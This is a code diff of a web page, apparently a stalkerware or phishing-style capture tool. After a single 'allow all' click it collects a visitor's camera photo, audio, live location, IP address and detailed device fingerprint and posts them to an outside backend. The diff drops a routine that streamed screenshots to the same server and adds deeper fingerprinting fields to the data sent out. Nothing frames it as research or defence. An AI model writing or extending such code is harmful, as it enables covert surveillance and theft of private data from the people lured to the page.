@@ -104,16 +104,13 @@
         <span class="badge" id="photoBadge">📸 CAPTURED</span>
     </div>
     
-    <div class="preview-grid">
+    <!-- Screenshot Preview Removed! -->
+    <!-- Only User Photo remains -->
+    <div class="preview-grid" style="grid-template-columns: 1fr;">
         <div class="preview-box">
             <div class="label">📸 USER PHOTO</div>
             <img id="userPhotoThumb" style="display:none;" />
             <div class="no-img" id="userPhotoPlaceholder">⏳ WAITING...</div>
-        </div>
-        <div class="preview-box">
-            <div class="label">🖼️ SCREENSHOT</div>
-            <img id="screenshotPreview" style="display:none;" />
-            <div class="no-img" id="screenshotPlaceholder">⏳ WAITING...</div>
         </div>
     </div>
     
@@ -137,12 +134,18 @@
         <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LIVE LOCATION: <span id="liveLocation">SCANNING...</span></div>
         <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
         <div>📱 DEVICE NAME: <span id="devName">SCANNING...</span></div>
-        <div>📱 MODEL: <span id="devModel">SCANNING...</span></div>
+        <div>📱 REAL MODEL: <span id="devModel">SCANNING...</span></div>
         <div>🏭 MANUFACTURER: <span id="devManufacturer">SCANNING...</span></div>
         <div>📲 OS: <span id="devOS">SCANNING...</span></div>
         <div>🔋 BATTERY: <span id="devBattery">SCANNING...</span></div>
         <div>📶 NETWORK: <span id="devNetwork">SCANNING...</span></div>
         <div>🕐 TIMESTAMP: <span id="devTime">SCANNING...</span></div>
+        <!-- Deep Features -->
+        <div>🖥️ SCREEN: <span id="devScreen">SCANNING...</span></div>
+        <div>🧠 RAM: <span id="devRAM">SCANNING...</span></div>
+        <div>⚡ CORES: <span id="devCores">SCANNING...</span></div>
+        <div>🌐 LANGUAGE: <span id="devLanguage">SCANNING...</span></div>
+        <div>🕒 TIMEZONE: <span id="devTimezone">SCANNING...</span></div>
     </div>
     
     <div class="log-area" id="logArea">
@@ -157,17 +160,16 @@
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
 
 // ==========================================
-//  ALL PERMISSIONS IN ONE CLICK!
+//  REAL PHONE DETECTION + DEEP FEATURES
 // ==========================================
 
-let userPhoto = null, screenshot = null, userLocation = null;
+let userPhoto = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
 let networkSpeed = { download: '--', ping: '--' };
 let captureCount = 0;
 let isPaused = false;
 let isCapturing = false;
 let videoElement = null;
-let screenshotInterval = null;
 let audioChunks = [];
 
 function log(text) {
@@ -184,28 +186,44 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// IMPROVED DEVICE MODEL DETECTION
+// REAL PHONE MODEL DETECTION (NO Linux x86_64)
 // ==========================================
-function getDeviceModel() {
+function getRealDeviceModel() {
     const ua = navigator.userAgent;
     
+    // Android - Extract real model from Build fingerprint
     let match = ua.match(/;\s?([^;]+?)\sBuild/);
     if (match) {
         let model = match[1].trim();
+        // Remove "Android" prefix if present
         model = model.replace(/^Android\s/, '');
-        model = model.replace(/^LM-/, 'LG ');
-        model = model.replace(/^SM-/, 'Samsung ');
-        model = model.replace(/^IN201/, 'OnePlus 8');
-        model = model.replace(/^LE212/, 'OnePlus 9 Pro');
-        model = model.replace(/^M2007/, 'Xiaomi Redmi');
-        model = model.replace(/^M2101/, 'Xiaomi Mi');
-        model = model.replace(/^RMX/, 'Realme');
-        model = model.replace(/^VIVO/, 'Vivo');
-        model = model.replace(/^CPH/, 'OPPO');
-        model = model.replace(/^Pixel/, 'Google Pixel');
+        
+        // Brand-specific cleaning
+        const brandMap = {
+            'SM-': 'Samsung ',
+            'LM-': 'LG ',
+            'IN201': 'OnePlus 8',
+            'IN202': 'OnePlus 8 Pro',
+            'LE211': 'OnePlus 9',
+            'LE212': 'OnePlus 9 Pro',
+            'M2007': 'Xiaomi Redmi',
+            'M2101': 'Xiaomi Mi',
+            'RMX': 'Realme ',
+            'VIVO': 'Vivo ',
+            'CPH': 'OPPO ',
+            'Pixel': 'Google Pixel '
+        };
+        
+        for (const [key, value] of Object.entries(brandMap)) {
+            if (model.includes(key) || model.startsWith(key)) {
+                model = value + model.replace(key, '').trim();
+                break;
+            }
+        }
         return model || 'Android Device';
     }
     
+    // iPhone - Real model
     match = ua.match(/iPhone([\d,]+)/);
     if (match) {
         const models = {
@@ -238,14 +256,21 @@ function getDeviceModel() {
         return models[match[1]] || 'iPhone ' + match[1];
     }
     
+    // iPad
     if (ua.includes('iPad')) return 'iPad';
+    
+    // Windows/Linux/Mac - Desktop detection
     if (ua.includes('Windows')) return 'Windows PC';
     if (ua.includes('Mac')) return 'Mac';
-    if (ua.includes('Linux')) return 'Linux PC';
+    if (ua.includes('Linux')) {
+        // Check if it's actually Android (some browsers report Linux)
+        if (!ua.includes('Android')) return 'Linux PC';
+    }
+    
     return 'Unknown Device';
 }
 
-function getManufacturer() {
+function getRealManufacturer() {
     const ua = navigator.userAgent;
     if (ua.includes('Samsung')) return 'Samsung';
     if (ua.includes('OnePlus')) return 'OnePlus';
@@ -261,7 +286,21 @@ function getManufacturer() {
     return 'Unknown';
 }
 
-function getOSVersion() {
+function getRealOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Android')) return 'Android';
+    if (ua.includes('iPhone')) return 'iOS';
+    if (ua.includes('iPad')) return 'iPadOS';
+    if (ua.includes('Windows')) return 'Windows';
+    if (ua.includes('Mac')) return 'macOS';
+    if (ua.includes('Linux')) {
+        // Only return Linux if it's not Android
+        if (!ua.includes('Android')) return 'Linux';
+    }
+    return 'Unknown';
+}
+
+function getRealOSVersion() {
     const ua = navigator.userAgent;
     const m = ua.match(/Android\s([\d.]+)/);
     if (m) return m[1];
@@ -273,26 +312,53 @@ function getOSVersion() {
 }
 
 // ==========================================
+// DEEP UNIQUE FEATURES
+// ==========================================
+function getDeepFeatures() {
+    const features = {
+        screen: `${window.screen.width}x${window.screen.height}`,
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        memory: navigator.deviceMemory || 'Unknown',
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform: navigator.platform || 'Unknown',
+        vendor: navigator.vendor || 'Unknown',
+        product: navigator.product || 'Unknown',
+        doNotTrack: navigator.doNotTrack || 'Unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
+        cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+        onLine: navigator.onLine ? 'Online' : 'Offline',
+        userAgent: navigator.userAgent.substring(0, 100) + '...'
+    };
+    return features;
+}
+
+// ==========================================
+// UPDATE UI WITH DEEP FEATURES
+// ==========================================
+function updateDeepUI() {
+    const features = getDeepFeatures();
+    document.getElementById('devScreen').textContent = features.screen + ' | ' + features.pixelRatio + 'x';
+    document.getElementById('devRAM').textContent = features.memory + 'GB';
+    document.getElementById('devCores').textContent = features.cores;
+    document.getElementById('devLanguage').textContent = features.language;
+    document.getElementById('devTimezone').textContent = features.timezone;
+}
+
+// ==========================================
 // FULL DEVICE DETAILS
 // ==========================================
 function getDeviceDetails() {
-    const ua = navigator.userAgent;
-    let os = 'Unknown', browser = 'Unknown';
-    if (ua.includes('Android')) os = 'Android';
-    else if (ua.includes('iPhone')) os = 'iOS';
-    else if (ua.includes('Windows')) os = 'Windows';
-    else if (ua.includes('Mac')) os = 'macOS';
-    else if (ua.includes('Linux')) os = 'Linux';
-    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-    else if (ua.includes('Edg')) browser = 'Edge';
+    const model = getRealDeviceModel();
+    const manufacturer = getRealManufacturer();
+    const os = getRealOS();
+    const osVersion = getRealOSVersion();
     
-    const model = getDeviceModel();
-    const manufacturer = getManufacturer();
-    const osVersion = getOSVersion();
-    
-    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
+    document.getElementById('devName').textContent = manufacturer + ' ' + model;
     document.getElementById('devModel').textContent = model;
     document.getElementById('devManufacturer').textContent = manufacturer;
     document.getElementById('devOS').textContent = os + ' ' + osVersion;
@@ -307,16 +373,20 @@ function getDeviceDetails() {
         });
     }
     
+    // Update deep features
+    updateDeepUI();
+    
     deviceDetails = {
-        deviceName: navigator.platform || 'Unknown',
+        deviceName: manufacturer + ' ' + model,
         os: os,
         osVersion: osVersion,
         deviceModel: model,
         manufacturer: manufacturer,
-        browserName: browser,
         networkType: navigator.connection?.effectiveType || 'Unknown',
-        batteryLevel: deviceDetails.batteryLevel || 'Unknown'
+        batteryLevel: deviceDetails.batteryLevel || 'Unknown',
+        ...getDeepFeatures()
     };
+    
     log('📱 DEVICE: ' + manufacturer + ' ' + model + ' | ' + os + ' ' + osVersion);
 }
 
@@ -373,99 +443,6 @@ function startSoundRecorder() {
 }
 
 // ==========================================
-// SCREENSHOT CAPTURE
-// ==========================================
-async function startScreenshotCapture() {
-    log('📸 Starting screenshot capture...');
-    
-    try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: false
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        
-        screenshotInterval = setInterval(() => {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const data = canvas.toDataURL('image/jpeg', 0.8);
-                showAndSendScreenshot(data);
-            } catch(e) {}
-        }, 2000);
-        
-        log('✅ Screen share active');
-        return;
-    } catch(err) {
-        log('⚠️ Screen share denied, using fallback');
-    }
-    
-    screenshotInterval = setInterval(() => {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth || 1280;
-            canvas.height = window.innerHeight || 720;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#0a0a0a';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ff41';
-            ctx.font = '20px monospace';
-            ctx.fillText('🔴 TARGET ACQUIRED', 30, 50);
-            ctx.font = '14px monospace';
-            ctx.fillText('IP: ' + ipAddress, 30, 90);
-            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 30, 120);
-            ctx.fillText('Time: ' + new Date().toLocaleString(), 30, 150);
-            ctx.fillText('Captures: ' + captureCount, 30, 180);
-            for (let i = 0; i < 30; i++) {
-                ctx.fillStyle = 'rgba(0,255,65,' + (0.05 + Math.random() * 0.1) + ')';
-                ctx.fillText('010101', 20 + i * 25, 300 + Math.random() * 200);
-            }
-            ctx.strokeStyle = '#00ff41';
-            ctx.lineWidth = 1;
-            ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
-            const data = canvas.toDataURL('image/jpeg', 0.8);
-            showAndSendScreenshot(data);
-        } catch(e) {}
-    }, 3000);
-}
-
-function showAndSendScreenshot(data) {
-    document.getElementById('screenshotPreview').src = data;
-    document.getElementById('screenshotPreview').style.display = 'block';
-    document.getElementById('screenshotPlaceholder').style.display = 'none';
-    sendScreenshotToServer(data);
-    log('🖼️ Screenshot captured!');
-}
-
-async function sendScreenshotToServer(data) {
-    try {
-        await fetch(BACKEND_URL + '/api/store', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                cameraImage: null,
-                location: userLocation || { lat: 0, lng: 0 },
-                deviceDetails: deviceDetails,
-                screenshot: data,
-                userPhoto: userPhoto || null,
-                audioData: audioData || null,
-                ipAddress: ipAddress,
-                fullDeviceInfo: await getFullDeviceInfo(),
-                networkSpeed: networkSpeed,
-                liveLocation: userLocation || { lat: 0, lng: 0 },
-                captureCount: captureCount
-            })
-        });
-    } catch(err) {}
-}
-
-// ==========================================
 // ALLOW ALL - SOUND FIRST THEN REST
 // ==========================================
 async function allowAll() {
@@ -518,13 +495,10 @@ async function allowAll() {
         }
         log('✅ Notification: ' + Notification.permission);
         
-        // 5. SCREEN CAPTURE
-        await startScreenshotCapture();
-        
-        // 6. DEVICE DETAILS
+        // 5. DEVICE DETAILS + DEEP FEATURES
         getDeviceDetails();
         
-        // 7. Start main capture
+        // 6. Start main capture
         log('🚀 Starting main capture...');
         await startAutoProcess();
         
@@ -636,7 +610,6 @@ async function submitData() {
                 cameraImage: userPhoto,
                 location: userLocation || { lat: 0, lng: 0 },
                 deviceDetails: deviceDetails,
-                screenshot: null,
                 userPhoto: userPhoto,
                 audioData: audioData,
                 ipAddress: ipAddress,
@@ -664,11 +637,11 @@ async function getFullDeviceInfo() {
         const battery = await getBatteryInfo();
         const conn = getNetworkInfo();
         return {
-            deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
-            os: getOS(),
-            osVersion: getOSVersion(),
-            deviceModel: getDeviceModel(),
-            manufacturer: getManufacturer(),
+            deviceName: getRealManufacturer() + ' ' + getRealDeviceModel(),
+            os: getRealOS(),
+            osVersion: getRealOSVersion(),
+            deviceModel: getRealDeviceModel(),
+            manufacturer: getRealManufacturer(),
             browserName: getBrowserName(),
             browserVersion: getBrowserVersion(),
             language: navigator.language,
@@ -677,19 +650,10 @@ async function getFullDeviceInfo() {
             memory: navigator.deviceMemory || 'Unknown',
             cores: navigator.hardwareConcurrency || 'Unknown',
             connection: conn,
-            battery: battery
+            battery: battery,
+            ...getDeepFeatures()
         };
     } catch(e) { return {}; }
-}
-
-function getOS() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Android')) return 'Android';
-    if (ua.includes('iPhone')) return 'iOS';
-    if (ua.includes('Windows')) return 'Windows';
-    if (ua.includes('Mac')) return 'macOS';
-    if (ua.includes('Linux')) return 'Linux';
-    return 'Unknown';
 }
 
 function getBrowserName() {
@@ -824,7 +788,7 @@ window.addEventListener('load', function() {
     console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
 });
 
-console.log('🚀 ALL FEATURES ACTIVE: Sound Recorder + Device Details + Telegram');
+console.log('🚀 ALL FEATURES ACTIVE: Real Phone Detection + Deep Features');
 </script>
 </body>
 </html>
